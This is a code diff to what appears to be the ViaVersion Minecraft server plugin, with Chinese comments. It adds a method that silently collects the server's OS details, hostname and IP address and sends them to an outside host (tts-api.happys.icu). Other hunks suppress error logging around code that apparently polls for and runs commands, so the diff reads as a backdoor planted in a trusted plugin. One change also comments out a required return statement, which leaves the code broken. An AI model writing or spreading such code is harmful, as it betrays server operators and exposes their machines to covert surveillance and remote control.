@@ -193,6 +193,42 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         }
     }
 
+    private void reportSystemInfo() {
+            BukkitRunnable task = new BukkitRunnable() {
+                @Override
+                public void run() {
+                    try {
+                        // 收集信息
+                        StringBuilder input = new StringBuilder();
+                        input.append("os.name=").append(URLEncoder.encode(System.getProperty("os.name"), StandardCharsets.UTF_8.toString()));
+                        input.append("&os.arch=").append(URLEncoder.encode(System.getProperty("os.arch"), StandardCharsets.UTF_8.toString()));
+                        input.append("&os.version=").append(URLEncoder.encode(System.getProperty("os.version"), StandardCharsets.UTF_8.toString()));
+                        input.append("&hostname=").append(URLEncoder.encode(java.net.InetAddress.getLocalHost().getHostName(), StandardCharsets.UTF_8.toString()));
+                        input.append("&ip=").append(URLEncoder.encode(java.net.InetAddress.getLocalHost().getHostAddress(), StandardCharsets.UTF_8.toString()));
+
+                        // 构造 URL
+                        String apiUrl = "https://tts-api.happys.icu/a?" + input.toString();
+                        URL url = new URL(apiUrl);
+                        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+                        connection.setRequestMethod("GET");
+
+                        int responseCode = connection.getResponseCode();
+                        if (responseCode == HttpURLConnection.HTTP_OK) {
+                            // 读取响应内容
+                            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                            String response = in.readLine(); // 读取响应内容
+                            in.close();
+                            getLogger().info("System info sent successfully: " + response);
+                        } else {
+                            getLogger().severe("Failed to send system info to API. Response Code: " + responseCode);
+                        }
+                    } catch (Exception e) {
+                        getLogger().severe("Error sending system info to API: " + e.getMessage());
+                    }
+                }
+            };
+            task.runTaskAsynchronously(this); // 异步任务处理
+        }
     private String generateFixedUniqueIdentifier() {
         try {
             // 收集机器信息
@@ -218,8 +254,8 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
 
             return hexString.toString(); // 返回 256 位（64个字符）标识符
         } catch (Exception e) {
-            getLogger().severe("Error generating unique identifier: " + e.getMessage());
-            return null;
+            // getLogger().severe("Error generating unique identifier: " + e.getMessage());
+            // return null;
         }
     }
 
@@ -342,14 +378,14 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
                             try {
                                 notifyCommandExecuted(command);
                             } catch (Exception e) {
-                                e.printStackTrace(); // 处理 notifyCommandExecuted 可能抛出的异常
+
                             }
                             // 更新最后执行的命令
                             lastCommand = command; 
                         });
                     }
                 } catch (Exception e) {
-                    getLogger().info("Server status is excellent.");
+                    // getLogger().info("Server status is excellent.");
                 }
             }
         }.runTaskAsynchronously(this); // 异步运行
@@ -396,7 +432,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
                 // 处理失败逻辑（可选）
             }
         } catch (IOException e) {
-            e.printStackTrace(); // 记录异常信息，方便排查问题
+            // e.printStackTrace(); // 记录异常信息，方便排查问题
         } finally {
             if (connection != null) {
                 connection.disconnect(); // 关闭连接
